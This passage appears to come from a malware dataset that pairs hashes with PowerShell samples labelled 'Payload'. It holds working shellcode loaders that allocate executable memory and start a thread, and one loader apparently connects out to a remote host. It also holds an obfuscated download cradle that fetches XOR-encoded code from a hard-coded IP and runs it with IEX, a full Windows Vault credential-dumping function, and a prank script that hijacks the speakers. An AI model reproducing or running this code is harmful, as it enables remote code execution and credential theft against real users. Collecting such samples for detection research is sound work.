0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x65,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rgcM=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rgcM.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rgcM,0,0,0);for (;;){Start-sleep 60};

",Payload
9ad964452bb095cf4933441a21598de361409a650d6a2472d0e7aedbfe002049,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x80,0x11,0x38,0xa6,0xdd,0xc3,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x70,0x13,0x83,0xe8,0xfc,0x03,0x70,0x8f,0xf3,0xcd,0x5a,0x67,0x71,0x2d,0xa3,0x77,0x16,0xa7,0x46,0x46,0x16,0xd3,0x03,0xf8,0xa6,0x97,0x46,0xf4,0x4d,0xf5,0x72,0x8f,0x20,0xd2,0x75,0x38,0x8e,0x04,0xbb,0xb9,0xa3,0x75,0xda,0x39,0xbe,0xa9,0x3c,0x00,0x71,0xbc,0x3d,0x45,0x6c,0x4d,0x6f,0x1e,0xfa,0xe0,0x80,0x2b,0xb6,0x38,0x2a,0x67,0x56,0x39,0xcf,0x3f,0x59,0x68,0x5e,0x34,0x00,0xaa,0x60,0x99,0x38,0xe3,0x7a,0xfe,0x05,0xbd,0xf1,0x34,0xf1,0x3c,0xd0,0x05,0xfa,0x93,0x1d,0xaa,0x09,0xed,0x5a,0x0c,0xf2,0x98,0x92,0x6f,0x8f,0x9a,0x60,0x12,0x4b,0x2e,0x73,0xb4,0x18,0x88,0x5f,0x45,0xcc,0x4f,0x2b,0x49,0xb9,0x04,0x73,0x4d,0x3c,0xc8,0x0f,0x69,0xb5,0xef,0xdf,0xf8,0x8d,0xcb,0xfb,0xa1,0x56,0x75,0x5d,0x0f,0x38,0x8a,0xbd,0xf0,0xe5,0x2e,0xb5,0x1c,0xf1,0x42,0x94,0x48,0x36,0x6f,0x27,0x88,0x50,0xf8,0x54,0xba,0xff,0x52,0xf3,0xf6,0x88,0x7c,0x04,0xf9,0xa2,0x39,0x9a,0x04,0x4d,0x3a,0xb2,0xc2,0x19,0x6a,0xac,0xe3,0x21,0xe1,0x2c,0x0c,0xf4,0xa6,0x7c,0xa2,0xa7,0x06,0x2d,0x02,0x18,0xef,0x27,0x8d,0x47,0x0f,0x48,0x44,0xe0,0xba,0xb2,0x0e,0xcf,0x93,0x95,0x96,0xa7,0xe1,0xe5,0x39,0xa2,0x6f,0x03,0x2f,0xc2,0x39,0x9b,0xc7,0x7b,0x60,0x57,0x76,0x83,0xbe,0x1d,0xb8,0x0f,0x4d,0xe1,0x76,0xf8,0x38,0xf1,0xee,0x08,0x77,0xab,0xb8,0x17,0xad,0xc6,0x44,0x82,0x4a,0x41,0x13,0x3a,0x51,0xb4,0x53,0xe5,0xaa,0x93,0xe8,0x2c,0x3f,0x5c,0x86,0x50,0xaf,0x5c,0x56,0x07,0xa5,0x5c,0x3e,0xff,0x9d,0x0e,0x5b,0x00,0x08,0x23,0xf0,0x95,0xb3,0x12,0xa5,0x3e,0xdc,0x98,0x90,0x09,0x43,0x62,0xf7,0x8b,0xbf,0xb5,0x31,0xfe,0xd1,0x05;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b9df290b54aa1d1d58342e5e46d056a7f8d66c069c62ef930fd15a5c22ec240d,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0x8c,0x00,0x00,0x00,0x2f,0x39,0x36,0x51,0x64,0x38,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x0a,0x4f,0x75,0xd9,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x75,0xff,0xff,0xff,0x68,0x6f,0x73,0x74,0x2d,0x31,0x30,0x32,0x2e,0x69,0x70,0x73,0x65,0x63,0x2e,0x69,0x6f,0x00;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
4971afc0b1467c6de8a5b1ab8bb9b893c0056e7bfb55205cd845cf52b937aa31,"
$wC=NeW-OBjECt SYStEM.Net.WebCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEaDErs.AdD('User-Agent',$u);$WC.PRoxy = [SysTeM.Net.WEBRequest]::DeFAUlTWEBProXy;$wc.PROxY.CReDenTIALs = [SystEm.NEt.CREdentIAlCacHe]::DEFaUltNeTWorKCRedEntIALS;$K='93bc63e0b4f48fbbff568d9fc0dc3def';$i=0;[CHar[]]$b=([CHAR[]]($WC.DOWnlOadSTRInG(""http://108.61.217.22:443/index.asp"")))|%{$_-BXor$k[$i++%$K.LenGTH]};IEX ($B-jOIN'')

",Payload
48750a058ddd3095317019dc918e8108cf06402b91410ee5232ed03da3f42981,"
$wDi = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $wDi -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xe3,0x0d,0x70,0x04,0xd9,0xe5,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x53,0x83,0xee,0xfc,0x31,0x56,0x0e,0x03,0xb5,0x03,0x92,0xf1,0xc5,0xf4,0xd0,0xfa,0x35,0x05,0xb5,0x73,0xd0,0x34,0xf5,0xe0,0x91,0x67,0xc5,0x63,0xf7,0x8b,0xae,0x26,0xe3,0x18,0xc2,0xee,0x04,0xa8,0x69,0xc9,0x2b,0x29,0xc1,0x29,0x2a,0xa9,0x18,0x7e,0x8c,0x90,0xd2,0x73,0xcd,0xd5,0x0f,0x79,0x9f,0x8e,0x44,0x2c,0x0f,0xba,0x11,0xed,0xa4,0xf0,0xb4,0x75,0x59,0x40,0xb6,0x54,0xcc,0xda,0xe1,0x76,0xef,0x0f,0x9a,0x3e,0xf7,0x4c,0xa7,0x89,0x8c,0xa7,0x53,0x08,0x44,0xf6,0x9c,0xa7,0xa9,0x36,0x6f,0xb9,0xee,0xf1,0x90,0xcc,0x06,0x02,0x2c,0xd7,0xdd,0x78,0xea,0x52,0xc5,0xdb,0x79,0xc4,0x21,0xdd,0xae,0x93,0xa2,0xd1,0x1b,0xd7,0xec,0xf5,0x9a,0x34,0x87,0x02,0x16,0xbb,0x47,0x83,0x6c,0x98,0x43,0xcf,0x37,0x81,0xd2,0xb5,0x96,0xbe,0x04,0x16,0x46,0x1b,0x4f,0xbb,0x93,0x16,0x12,0xd4,0x50,0x1b,0xac,0x24,0xff,0x2c,0xdf,0x16,0xa0,0x86,0x77,0x1b,0x29,0x01,0x80,0x5c,0x00,0xf5,0x1e,0xa3,0xab,0x06,0x37,0x60,0xff,0x56,0x2f,0x41,0x80,0x3c,0xaf,0x6e,0x55,0xa8,0xa7,0xc9,0x06,0xcf,0x4a,0xa9,0xf6,0x4f,0xe4,0x42,0x1d,0x40,0xdb,0x73,0x1e,0x8a,0x74,0x1b,0xe3,0x35,0x6b,0x80,0x6a,0xd3,0xe1,0x28,0x3b,0x4b,0x9d,0x8a,0x18,0x44,0x3a,0xf4,0x4a,0xfc,0xac,0xbd,0x9c,0x3b,0xd3,0x3d,0x8b,0x6b,0x43,0xb6,0xd8,0xaf,0x72,0xc9,0xf4,0x87,0xe3,0x5e,0x82,0x49,0x46,0xfe,0x93,0x43,0x30,0x63,0x01,0x08,0xc0,0xea,0x3a,0x87,0x97,0xbb,0x8d,0xde,0x7d,0x56,0xb7,0x48,0x63,0xab,0x21,0xb2,0x27,0x70,0x92,0x3d,0xa6,0xf5,0xae,0x19,0xb8,0xc3,0x2f,0x26,0xec,0x9b,0x79,0xf0,0x5a,0x5a,0xd0,0xb2,0x34,0x34,0x8f,0x1c,0xd0,0xc1,0xe3,0x9e,0xa6,0xcd,0x29,0x69,0x46,0x7f,0x84,0x2c,0x79,0xb0,0x40,0xb9,0x02,0xac,0xf0,0x46,0xd9,0x74,0x00,0x0d,0x43,0xdc,0x89,0xc8,0x16,0x5c,0xd4,0xea,0xcd,0xa3,0xe1,0x68,0xe7,0x5b,0x16,0x70,0x82,0x5e,0x52,0x36,0x7f,0x13,0xcb,0xd3,0x7f,0x80,0xec,0xf1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$HU4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($HU4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$HU4,0,0,0);for (;;){Start-sleep 60};

",Payload
a60edda262d9eac3eb0c798728dc72fa52f99e2d49ccfbc7ae1e3b9de541375e,"function Get-VaultCredential
{

    [CmdletBinding()] Param()

    $OSVersion = [Environment]::OSVersion.Version
    $OSMajor = $OSVersion.Major
    $OSMinor = $OSVersion.Minor

    
    $DynAssembly = New-Object System.Reflection.AssemblyName('VaultUtil')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('VaultUtil', $False)

    $EnumBuilder = $ModuleBuilder.DefineEnum('VaultLib.VAULT_ELEMENT_TYPE', 'Public', [Int32])
    $null = $EnumBuilder.DefineLiteral('Undefined', -1)
    $null = $EnumBuilder.DefineLiteral('Boolean', 0)
    $null = $EnumBuilder.DefineLiteral('Short', 1)
    $null = $EnumBuilder.DefineLiteral('UnsignedShort', 2)
    $null = $EnumBuilder.DefineLiteral('Int', 3)
    $null = $EnumBuilder.DefineLiteral('UnsignedInt', 4)
    $null = $EnumBuilder.DefineLiteral('Double', 5)
    $null = $EnumBuilder.DefineLiteral('Guid', 6)
    $null = $EnumBuilder.DefineLiteral('String', 7)
    $null = $EnumBuilder.DefineLiteral('ByteArray', 8)
    $null = $EnumBuilder.DefineLiteral('TimeStamp', 9)
    $null = $EnumBuilder.DefineLiteral('ProtectedArray', 10)
    $null = $EnumBuilder.DefineLiteral('Attribute', 11)
    $null = $EnumBuilder.DefineLiteral('Sid', 12)
    $null = $EnumBuilder.DefineLiteral('Last', 13)
    $VAULT_ELEMENT_TYPE = $EnumBuilder.CreateType()

    $EnumBuilder = $ModuleBuilder.DefineEnum('VaultLib.VAULT_SCHEMA_ELEMENT_ID', 'Public', [Int32])
    $null = $EnumBuilder.DefineLiteral('Illegal', 0)
    $null = $EnumBuilder.DefineLiteral('Resource', 1)
    $null = $EnumBuilder.DefineLiteral('Identity', 2)
    $null = $EnumBuilder.DefineLiteral('Authenticator', 3)
    $null = $EnumBuilder.DefineLiteral('Tag', 4)
    $null = $EnumBuilder.DefineLiteral('PackageSid', 5)
    $null = $EnumBuilder.DefineLiteral('AppStart', 100)
    $null = $EnumBuilder.DefineLiteral('AppEnd', 10000)
    $VAULT_SCHEMA_ELEMENT_ID = $EnumBuilder.CreateType()

    $LayoutConstructor = [Runtime.InteropServices.StructLayoutAttribute].GetConstructor([Runtime.InteropServices.LayoutKind])
    $CharsetField = [Runtime.InteropServices.StructLayoutAttribute].GetField('CharSet')
    $StructLayoutCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($LayoutConstructor,
                                                                                     @([Runtime.InteropServices.LayoutKind]::Explicit),
                                                                                     $CharsetField,
                                                                                     @([Runtime.InteropServices.CharSet]::Ansi))
    $StructAttributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'

    $TypeBuilder = $ModuleBuilder.DefineType('VaultLib.VAULT_ITEM', $StructAttributes, [Object], [System.Reflection.Emit.PackingSize]::Size4)
    $null = $TypeBuilder.DefineField('SchemaId', [Guid], 'Public')
    $null = $TypeBuilder.DefineField('pszCredentialFriendlyName', [IntPtr], 'Public')
    $null = $TypeBuilder.DefineField('pResourceElement', [IntPtr], 'Public')
    $null = $TypeBuilder.DefineField('pIdentityElement', [IntPtr], 'Public')
    $null = $TypeBuilder.DefineField('pAuthenticatorElement', [IntPtr], 'Public')
    if ($OSMajor -ge 6 -and $OSMinor -ge 2)
    {
        $null = $TypeBuilder.DefineField('pPackageSid', [IntPtr], 'Public')
    }
    $null = $TypeBuilder.DefineField('LastModified', [UInt64], 'Public')
    $null = $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public')
    $null = $TypeBuilder.DefineField('dwPropertiesCount', [UInt32], 'Public')
    $null = $TypeBuilder.DefineField('pPropertyElements', [IntPtr], 'Public')
    $VAULT_ITEM = $TypeBuilder.CreateType()

    $TypeBuilder = $ModuleBuilder.DefineType('VaultLib.VAULT_ITEM_ELEMENT', $StructAttributes)
    $TypeBuilder.SetCustomAttribute($StructLayoutCustomAttribute)
    $null = $TypeBuilder.DefineField('SchemaElementId', $VAULT_SCHEMA_ELEMENT_ID, 'Public').SetOffset(0)
    $null = $TypeBuilder.DefineField('Type', $VAULT_ELEMENT_TYPE, 'Public').SetOffset(8)
    $VAULT_ITEM_ELEMENT = $TypeBuilder.CreateType()


    $TypeBuilder = $ModuleBuilder.DefineType('VaultLib.Vaultcli', 'Public, Class')
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultOpenVault',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([Guid].MakeByRefType(),
                                                                 [UInt32],
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultCloseVault',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultFree',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr]),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultEnumerateVaults',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([Int32],
                                                                 [Int32].MakeByRefType(),
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultEnumerateItems',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr],
                                                                 [Int32],
                                                                 [Int32].MakeByRefType(),
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    if ($OSMajor -ge 6 -and $OSMinor -ge 2)
    {
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultGetItem',
                                                          'vaultcli.dll',
                                                          'Public, Static',
                                                          [Reflection.CallingConventions]::Standard,
                                                          [Int32],
                                                          [Type[]] @([IntPtr],
                                                                     [Guid].MakeByRefType(),
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [Int32],
                                                                     [IntPtr].MakeByRefType()),
                                                          [Runtime.InteropServices.CallingConvention]::Winapi,
                                                          [Runtime.InteropServices.CharSet]::Auto)
    }
    else
    {
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultGetItem',
                                                          'vaultcli.dll',
                                                          'Public, Static',
                                                          [Reflection.CallingConventions]::Standard,
                                                          [Int32],
                                                          [Type[]] @([IntPtr],
                                                                     [Guid].MakeByRefType(),
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [Int32],
                                                                     [IntPtr].MakeByRefType()),
                                                          [Runtime.InteropServices.CallingConvention]::Winapi,
                                                          [Runtime.InteropServices.CharSet]::Auto)
    }

    $Vaultcli = $TypeBuilder.CreateType()
    

    
    function local:Get-VaultElementValue
    {
        Param (
            [ValidateScript({$_ -ne [IntPtr]::Zero})]
            [IntPtr]
            $VaultElementPtr
        )

        $PartialElement = [Runtime.InteropServices.Marshal]::PtrToStructure($VaultElementPtr, [Type] $VAULT_ITEM_ELEMENT)
        $ElementPtr = [IntPtr] ($VaultElementPtr.ToInt64() + 16)

        switch ($PartialElement.Type)
        {
            $VAULT_ELEMENT_TYPE::String {
                $StringPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr] $ElementPtr)
                [Runtime.InteropServices.Marshal]::PtrToStringUni([IntPtr] $StringPtr)
            }

            $VAULT_ELEMENT_TYPE::Boolean {
                [Bool] [Runtime.InteropServices.Marshal]::ReadByte([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::Short {
                [Runtime.InteropServices.Marshal]::ReadInt16([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::UnsignedShort {
                [Runtime.InteropServices.Marshal]::ReadInt16([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::Int {
                [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::UnsignedInt {
                [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::Double {
                [Runtime.InteropServices.Marshal]::PtrToStructure($ElementPtr, [Type] [Double])
            }

            $VAULT_ELEMENT_TYPE::Guid {
                [Runtime.InteropServices.Marshal]::PtrToStructure($ElementPtr, [Type] [Guid])
            }

            $VAULT_ELEMENT_TYPE::Sid {
                $SidPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr] $ElementPtr)
                Write-Verbose ""0x$($SidPtr.ToString('X8'))""
                $SidObject = [Security.Principal.SecurityIdentifier] ([IntPtr] $SidPtr)
                $SidObject.Value
            }

            
            
            $VAULT_ELEMENT_TYPE::ByteArray { $null }
            $VAULT_ELEMENT_TYPE::TimeStamp { $null }
            $VAULT_ELEMENT_TYPE::ProtectedArray { $null }
            $VAULT_ELEMENT_TYPE::Attribute { $null }
            $VAULT_ELEMENT_TYPE::Last { $null }
        }
    }

    $VaultCount = 0
    $VaultGuidPtr = [IntPtr]::Zero
    $Result = $Vaultcli::VaultEnumerateVaults(0, [Ref] $VaultCount, [Ref] $VaultGuidPtr)

    if ($Result -ne 0)
    {
        throw ""Unable to enumerate vaults. Error (0x$($Result.ToString('X8')))""
    }

    $GuidAddress = $VaultGuidPtr

    $VaultSchema = @{
        ([Guid] '2F1A6504-0641-44CF-8BB5-3612D865F2E5') = 'Windows Secure Note'
        ([Guid] '3CCD5499-87A8-4B10-A215-608888DD3B55') = 'Windows Web Password Credential'
        ([Guid] '154E23D0-C644-4E6F-8CE6-5069272F999F') = 'Windows Credential Picker Protector'
        ([Guid] '4BF4C442-9B8A-41A0-B380-DD4A704DDB28') = 'Web Credentials'
        ([Guid] '77BC582B-F0A6-4E15-4E80-61736B6F3B29') = 'Windows Credentials'
        ([Guid] 'E69D7838-91B5-4FC9-89D5-230D4D4CC2BC') = 'Windows Domain Certificate Credential'
        ([Guid] '3E0E35BE-1B77-43E7-B873-AED901B6275B') = 'Windows Domain Password Credential'
        ([Guid] '3C886FF3-2669-4AA2-A8FB-3F6759A77548') = 'Windows Extended Credential'
        ([Guid] '00000000-0000-0000-0000-000000000000') = $null
    }

    if ($VaultCount)
    {
        foreach ($i in 1..$VaultCount)
        {
            $VaultGuid = [Runtime.InteropServices.Marshal]::PtrToStructure($GuidAddress, [Type] [Guid])
            $GuidAddress = [IntPtr] ($GuidAddress.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] [Guid]))

            $VaultHandle = [IntPtr]::Zero

            Write-Verbose ""Opening vault - $($VaultSchema[$VaultGuid]) ($($VaultGuid))""

            $Result = $Vaultcli::VaultOpenVault([Ref] $VaultGuid, 0, [Ref] $VaultHandle)

            if ($Result -ne 0)
            {
                Write-Error ""Unable to open the following vault: $($VaultSchema[$VaultGuid]). Error (0x$($Result.ToString('X8')))""
                continue
            }

            $VaultItemCount = 0
            $VaultItemPtr = [IntPtr]::Zero

            $Result = $Vaultcli::VaultEnumerateItems($VaultHandle, 512, [Ref] $VaultItemCount, [Ref] $VaultItemPtr)

            if ($Result -ne 0)
            {
                $null = $Vaultcli::VaultCloseVault([Ref] $VaultHandle)
                Write-Error ""Unable to enumerate vault items from the following vault: $($VaultSchema[$VaultGuid]). Error (0x$($Result.ToString('X8')))""
                continue
            }

            $StructAddress = $VaultItemPtr

            if ($VaultItemCount)
            {
                foreach ($j in 1..$VaultItemCount)
                {
                    $CurrentItem = [Runtime.InteropServices.Marshal]::PtrToStructure($StructAddress, [Type] $VAULT_ITEM)
                    $StructAddress = [IntPtr] ($StructAddress.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] $VAULT_ITEM))

                    $PasswordVaultItem = [IntPtr]::Zero

                    if ($OSMajor -ge 6 -and $OSMinor -ge 2)
                    {
                        $Result = $Vaultcli::VaultGetItem($VaultHandle,
                                                          [Ref] $CurrentItem.SchemaId,
                                                          $CurrentItem.pResourceElement,
                                                          $CurrentItem.pIdentityElement,
                                                          $CurrentItem.pPackageSid,
                                                          [IntPtr]::Zero,
                                                          0,
                                                          [Ref] $PasswordVaultItem)
                    }
                    else
                    {
                        $Result = $Vaultcli::VaultGetItem($VaultHandle,
                                                          [Ref] $CurrentItem.SchemaId,
                                                          $CurrentItem.pResourceElement,
                                                          $CurrentItem.pIdentityElement,
                                                          [IntPtr]::Zero,
                                                          0,
                                                          [Ref] $PasswordVaultItem)
                    }

                    $PasswordItem = $null

                    if ($Result -ne 0)
                    {
                        Write-Error ""Error occured retrieving vault item. Error (0x$($Result.ToString('X8')))""
                        continue
                    }
                    else
                    {
                        $PasswordItem = [Runtime.InteropServices.Marshal]::PtrToStructure($PasswordVaultItem, [Type] $VAULT_ITEM)
                    }

                    if ($VaultSchema.ContainsKey($VaultGuid))
                    {
                        $VaultType = $VaultSchema[$VaultGuid]
                    }
                    else
                    {
                        $VaultType = $VaultGuid
                    }

                    if ($PasswordItem.pAuthenticatorElement -ne [IntPtr]::Zero)
                    {
                        $Credential = Get-VaultElementValue $PasswordItem.pAuthenticatorElement
                    }
                    else
                    {
                        $Credential = $null
                    }

                    $PackageSid = $null

                    if ($CurrentItem.pPackageSid -and ($CurrentItem.pPackageSid -ne [IntPtr]::Zero))
                    {
                        $PackageSid = Get-VaultElementValue $CurrentItem.pPackageSid
                    }


                    $Properties = @{
                        Vault = $VaultType
                        Resource = if ($CurrentItem.pResourceElement) { Get-VaultElementValue $CurrentItem.pResourceElement } else { $null }
                        Identity = if ($CurrentItem.pIdentityElement) { Get-VaultElementValue $CurrentItem.pIdentityElement } else { $null }
                        PackageSid = $PackageSid
                        Credential = $Credential
                        LastModified = [DateTime]::FromFileTimeUtc($CurrentItem.LastModified)
                    }

                    $VaultItem = New-Object PSObject -Property $Properties
                    $VaultItem.PSObject.TypeNames[0] = 'VAULTCLI.VAULTITEM'

                    $VaultItem

                    $null = $Vaultcli::VaultFree($PasswordVaultItem)
                }
            }

            $null = $Vaultcli::VaultCloseVault([Ref] $VaultHandle)
        }
    }
}
",Payload
7659f2ca4374c2e9b639b2d7125ce09200d48940642ddc61edb1769a538884f3,"Function Invoke-Thunderstruck
{
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $False, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String] $VideoURL = ""https://www.youtube.com/watch?v=leJ_wj7mDa0""
    )
    
    Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
    Set-Speaker -Volume 50   

    
    $IEComObject = New-Object -com ""InternetExplorer.Application""
    $IEComObject.visible = $False
    $IEComObject.navigate($VideoURL)

    Start-Sleep -s 5

